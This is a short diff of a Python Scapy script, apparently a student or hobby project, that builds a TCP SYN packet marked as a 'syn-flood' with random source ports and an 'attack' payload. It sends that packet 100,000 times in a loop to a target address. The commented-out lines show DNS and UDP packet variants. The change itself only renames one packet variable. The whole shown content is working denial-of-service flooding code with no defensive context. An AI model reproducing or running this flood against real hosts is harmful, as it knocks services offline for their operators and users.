@@ -36,7 +36,7 @@ def main():
     #pkt = pkt / IP(dst=addr) / UDP(sport=53)
     #pkt = pkt / IP(dst=addr) / UDP(sport=random.randint(49152,65535),dport=53) / DNS(id = 111,qr = 0,opcode = 0,rd = 1)
     pkt = pkt /IP(dst=addr) / TCP(dport=1234, sport=random.randint(49152,65535) , flags=2 ) / "attack" #syn-flood
-    pkt = pkt /IP(dst=addr) / TCP(dport=1234, sport=random.randint(49152,65535) , ack=1, flags=2 ) / "attack"
+    pkt2 = pkt /IP(dst=addr) / TCP(dport=1234, sport=random.randint(49152,65535) , ack=1, flags=2 ) / "attack"
     for pac in range(100000):
         sendp(pkt, iface=iface, verbose=False)
     #pkt.show2()
